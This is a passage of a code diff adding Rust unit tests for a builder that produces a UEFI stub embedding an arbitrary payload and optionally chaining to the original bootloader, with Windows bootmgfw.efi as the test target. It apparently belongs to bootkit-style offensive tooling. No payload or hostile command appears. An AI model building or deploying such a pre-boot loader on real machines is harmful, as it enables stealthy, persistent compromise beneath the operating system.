+            "Raw payload path should allocate EFI_LOADER_CODE pages via BootServices->AllocatePages"
+        );
+        assert!(
+            !find_subsequence(&result.binary, &[0x48, 0x8D, 0x3D]),
+            "Raw payload path must not jump directly into .rdata"
+        );
+    }
+
+    #[test]
+    fn build_efi_stub_embedded_pe_uses_load_image() {
+        let config = EfiPayloadConfig {
+            payload_data: minimal_pe_payload(),
+            second_stage_path: String::new(),
+            entry_point_offset: 0,
+            chain_to_original: false,
+            original_bootloader_path: String::new(),
+        };
+        let result = build_efi_stub(&config).unwrap();
+
+        assert!(
+            find_subsequence(&result.binary, &[0x4C, 0x8D, 0x0D]),
+            "Embedded PE path should pass SourceBuffer via r9"
+        );
+        assert!(
+            find_subsequence(&result.binary, &[0x41, 0xFF, 0x96, 0xC8, 0, 0, 0]),
+            "Embedded PE path should call BootServices->LoadImage"
+        );
+    }
+
+    #[test]
+    fn raw_payload_entry_offset_must_be_in_bounds() {
+        let mut config = test_payload_config();
+        config.entry_point_offset = config.payload_data.len() as u32;
+
+        assert!(build_efi_stub(&config).is_err());
     }
 
     #[test]
@@ -758,7 +1309,11 @@ mod tests {
         let result = build_efi_stub(&config).unwrap();
 
         // The stub should be at least 2048 bytes (headers + sections).
-        assert!(result.size >= 2048, "Stub size {} is too small", result.size);
+        assert!(
+            result.size >= 2048,
+            "Stub size {} is too small",
+            result.size
+        );
 
         // The stub should not be excessively large.
         assert!(
@@ -811,14 +1366,44 @@ mod tests {
     }
 
     #[test]
+    fn build_efi_stub_chain_to_original_embeds_original_device_path() {
+        let original_path = r"\EFI\Microsoft\Boot\bootmgfw.efi";
+        let config = EfiPayloadConfig {
+            payload_data: minimal_pe_payload(),
+            second_stage_path: String::new(),
+            entry_point_offset: 0,
+            chain_to_original: true,
+            original_bootloader_path: original_path.to_string(),
+        };
+        let result = build_efi_stub(&config).unwrap();
+
+        assert!(
+            find_subsequence(&result.binary, &utf16_path_bytes(original_path)),
+            "Original bootloader path should be embedded as an EFI FILE_PATH device path"
+        );
+        assert!(
+            find_subsequence(&result.binary, &[0x41, 0xFF, 0x96, 0xC8, 0, 0, 0]),
+            "Original bootloader path should be loaded through BootServices->LoadImage"
+        );
+    }
+
+    #[test]
+    fn chain_to_original_requires_original_bootloader_path() {
+        let config = EfiPayloadConfig {
+            payload_data: minimal_pe_payload(),
+            second_stage_path: String::new(),
+            entry_point_offset: 0,
+            chain_to_original: true,
+            original_bootloader_path: String::new(),
+        };
+
+        assert!(build_efi_stub(&config).is_err());
+    }
+
+    #[test]
     fn dos_header_pe_offset_correct() {
         let dos = build_dos_header();
-        let pe_offset = u32::from_le_bytes([
-            dos[0x3C],
-            dos[0x3D],
-            dos[0x3E],
-            dos[0x3F],
-        ]);
+        let pe_offset = u32::from_le_bytes([dos[0x3C], dos[0x3D], dos[0x3E], dos[0x3F]]);
         assert_eq!(pe_offset, DOS_HEADER_SIZE as u32);
     }
 
